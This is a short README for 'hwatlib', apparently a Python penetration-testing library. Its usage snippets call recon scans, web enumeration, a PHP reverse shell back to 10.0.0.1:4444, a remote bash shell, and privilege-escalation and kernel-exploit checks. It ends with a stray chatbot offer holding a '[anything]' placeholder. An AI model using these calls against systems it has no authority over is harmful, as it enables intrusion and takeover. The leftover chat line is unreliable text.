# hwatlib

A practical pentesting and exploitation library with wrappers for recon, web enumeration, reverse shells, and privilege escalation.

---

To install, run:

```bash
pip3 install hwatlib
```

## Basic Usage:

```python3
from hwatlib import *

# Recon example
recon.init("example.com", add_to_hosts=True)
recon.nmap_scan()
recon.banner_grab()

# Web enumeration
web.fetch_all("http://example.com")

# Exploit (reverse shell)
exploit.php_reverse_shell("10.0.0.1", 4444)
```

## Privilege Escalation

```python3
from hwatlib import *

# Run various local privesc checks
privesc.run_checks()
privesc.enumerate_sudo()
privesc.enumerate_cron()
privesc.kernel_exploits()
```

## Custom IO / Remote Exploitation

```python3
from hwatlib import *

# Connect to remote host
remote = exploit.connect_remote("10.0.0.1", 31337)
remote.run_shell("bash")
```

## Web Exploitation

```python3
from hwatlib import *

# Fetchers and enumeration
web.fetch_headers("http://example.com")
web.fetch_forms("http://example.com/login")
web.fetch_js("http://example.com")
```

Hwatlib is under continuous development and more features for pentesting, recon, exploitation, and post-exploitation will be added.

```console
If you want, I can also **write a shorter [anything] version** like hwatlib’s style that highlights **any concept of your choice**. Do you want me to do that?
```
